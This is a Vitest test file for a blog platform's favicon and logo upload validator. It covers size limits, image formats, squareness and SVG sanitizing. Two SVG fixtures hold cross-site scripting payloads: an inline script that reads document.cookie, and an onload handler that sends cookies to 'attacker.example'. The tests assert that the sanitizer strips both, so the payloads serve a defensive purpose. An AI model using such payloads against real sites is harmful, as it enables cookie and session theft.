import { ACTION_OUTCOME } from '@blog/config';
import { SITE_CONFIG_LOG } from '@platform/constants/site-config';
import { UPLOAD_REFUSAL } from '@platform/constants/upload';
import { MAX_UPLOAD_BYTES } from '@platform/utils/brand-asset-limits/brand-asset-limits';
import { logger } from '@platform/utils/logger/logger';

import { sanitizeSvgMarkup } from './sanitize-svg-markup';
import { validateBrandAssetUpload } from './validate-brand-asset';

vi.mock('./sanitize-svg-markup', { spy: true });

const PNG_TYPE = 'image/png';
const SVG_TYPE = 'image/svg+xml';
const PNG_FILENAME = 'upload.png';

const buildPngBuffer = (width: number, height: number): Buffer => {
  const buffer = Buffer.alloc(33);
  buffer.write('\x89PNG\r\n\x1a\n', 0, 'latin1');
  buffer.writeUInt32BE(13, 8);
  buffer.write('IHDR', 12, 'latin1');
  buffer.writeUInt32BE(width, 16);
  buffer.writeUInt32BE(height, 20);
  buffer[24] = 8;
  buffer[25] = 6;
  return buffer;
};

const pngFile = (width: number, height: number, sizeOverrideBytes?: number) => {
  const bytes = buildPngBuffer(width, height);
  const padded = sizeOverrideBytes
    ? Buffer.concat([bytes, Buffer.alloc(sizeOverrideBytes)])
    : bytes;
  return new File([new Uint8Array(padded)], PNG_FILENAME, {
    type: PNG_TYPE,
  });
};

const svgFile = (markup: string, filename = 'upload.svg') => {
  return new File([markup], filename, { type: SVG_TYPE });
};

describe(validateBrandAssetUpload, () => {
  it('accepts a square PNG for the favicon', async () => {
    const result = await validateBrandAssetUpload(pngFile(64, 64), 'favicon');

    expect(result).toEqual({
      ok: true,
      data: {
        buffer: expect.any(Buffer),
        contentType: PNG_TYPE,
        extension: 'png',
      },
    });
  });

  it('accepts a non-square PNG for the logo', async () => {
    const result = await validateBrandAssetUpload(pngFile(300, 80), 'logo');

    expect(result.ok).toBe(true);
  });

  it('rejects a non-square favicon with a reason naming the actual dimensions', async () => {
    const result = await validateBrandAssetUpload(pngFile(64, 40), 'favicon');

    expect(result).toEqual({
      ok: false,
      error: {
        outcome: ACTION_OUTCOME.REFUSED,
        reason: UPLOAD_REFUSAL.FAVICON_NOT_SQUARE,
        values: { width: 64, height: 40 },
      },
    });
  });

  it('rejects an empty file', async () => {
    const file = new File([], 'empty.png', { type: PNG_TYPE });

    const result = await validateBrandAssetUpload(file, 'logo');

    expect(result).toEqual({
      ok: false,
      error: {
        outcome: ACTION_OUTCOME.REFUSED,
        reason: UPLOAD_REFUSAL.FILE_MISSING,
      },
    });
  });

  it('rejects a file over the size limit before reading its bytes', async () => {
    const file = pngFile(64, 64, MAX_UPLOAD_BYTES.favicon);

    const result = await validateBrandAssetUpload(file, 'favicon');

    expect(result).toEqual({
      ok: false,
      error: {
        outcome: ACTION_OUTCOME.REFUSED,
        reason: UPLOAD_REFUSAL.FILE_TOO_LARGE,
        values: { limit: '1.0 MB' },
      },
    });
  });

  it('rejects a format it can read but never lets through, regardless of the declared MIME type', async () => {
    const gifBuffer = Buffer.alloc(10);
    gifBuffer.write('GIF89a', 0, 'latin1');
    gifBuffer.writeUInt16LE(64, 6);
    gifBuffer.writeUInt16LE(64, 8);
    const file = new File([new Uint8Array(gifBuffer)], 'upload.gif', {
      type: 'image/gif',
    });

    const result = await validateBrandAssetUpload(file, 'logo');

    expect(result).toEqual({
      ok: false,
      error: {
        outcome: ACTION_OUTCOME.REFUSED,
        reason: UPLOAD_REFUSAL.BRAND_IMAGE_TYPE_UNSUPPORTED,
      },
    });
  });

  it('accepts a clean square SVG for the favicon', async () => {
    const svg =
      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/></svg>';

    const result = await validateBrandAssetUpload(svgFile(svg), 'favicon');

    expect(result).toEqual({
      ok: true,
      data: {
        buffer: expect.any(Buffer),
        contentType: SVG_TYPE,
        extension: 'svg',
      },
    });
  });

  it('accepts a non-square SVG for the logo', async () => {
    const svg =
      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 300 80"><rect width="300" height="80"/></svg>';

    const result = await validateBrandAssetUpload(svgFile(svg), 'logo');

    expect(result.ok).toBe(true);
  });

  it('rejects a non-square favicon SVG using its viewBox aspect ratio', async () => {
    const svg =
      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 40"><rect width="100" height="40"/></svg>';

    const result = await validateBrandAssetUpload(svgFile(svg), 'favicon');

    expect(result).toEqual({
      ok: false,
      error: {
        outcome: ACTION_OUTCOME.REFUSED,
        reason: UPLOAD_REFUSAL.SVG_FAVICON_NOT_SQUARE,
        values: { width: 100, height: 40 },
      },
    });
  });

  it('rejects an SVG that declares no width/height/viewBox to check squareness against', async () => {
    const svg = '<svg xmlns="http://www.w3.org/2000/svg"></svg>';

    const result = await validateBrandAssetUpload(svgFile(svg), 'favicon');

    expect(result).toEqual({
      ok: false,
      error: {
        outcome: ACTION_OUTCOME.REFUSED,
        reason: UPLOAD_REFUSAL.UNREADABLE_IMAGE,
      },
    });
  });

  it('sanitizes an embedded <script> out of an SVG logo upload instead of passing it through', async () => {
    const malicious =
      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><script>alert(document.cookie)</script><circle cx="12" cy="12" r="10"/></svg>';

    const result = await validateBrandAssetUpload(svgFile(malicious), 'logo');

    expect(result.ok).toBe(true);
    if (result.ok) {
      const written = result.data.buffer.toString('utf-8');
      expect(written).not.toContain('<script');
      expect(written).not.toContain('alert(document.cookie)');
    }
  });

  it('sanitizes an onload event-handler attribute out of an SVG favicon upload instead of passing it through', async () => {
    const malicious =
      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" onload="fetch(\'https://attacker.example/steal?c=\'+document.cookie)"><circle cx="12" cy="12" r="10"/></svg>';

    const result = await validateBrandAssetUpload(
      svgFile(malicious),
      'favicon',
    );

    expect(result.ok).toBe(true);
    if (result.ok) {
      const written = result.data.buffer.toString('utf-8');
      expect(written).not.toContain('onload');
      expect(written).not.toContain('attacker.example');
    }
  });

  it('rejects unreadable bytes even when the declared MIME type claims to be an image', async () => {
    const file = new File(['not an image'], PNG_FILENAME, {
      type: PNG_TYPE,
    });

    const result = await validateBrandAssetUpload(file, 'logo');

    expect(result).toEqual({
      ok: false,
      error: {
        outcome: ACTION_OUTCOME.REFUSED,
        reason: UPLOAD_REFUSAL.UNREADABLE_IMAGE,
      },
    });
  });

  it('rejects a logo below the minimum dimension bound', async () => {
    const result = await validateBrandAssetUpload(pngFile(8, 8), 'logo');

    expect(result).toEqual({
      ok: false,
      error: {
        outcome: ACTION_OUTCOME.REFUSED,
        reason: UPLOAD_REFUSAL.IMAGE_TOO_SMALL,
        values: { size: 32 },
      },
    });
  });

  it('logs once and reports an upload failure when sanitising throws', async () => {
    const cause = new Error('sanitiser unavailable');
    vi.mocked(sanitizeSvgMarkup).mockRejectedValueOnce(cause);

    const result = await validateBrandAssetUpload(
      svgFile('<svg viewBox="0 0 24 24"></svg>'),
      'logo',
    );

    expect(result).toEqual({
      ok: false,
      error: { outcome: ACTION_OUTCOME.SERVER_ERROR },
    });
    expect(logger.error).toHaveBeenCalledOnce();
    expect(logger.error).toHaveBeenCalledWith(
      SITE_CONFIG_LOG.SVG_SANITIZE_FAILED,
      {
        kind: 'logo',
        error: cause,
      },
    );
  });
});
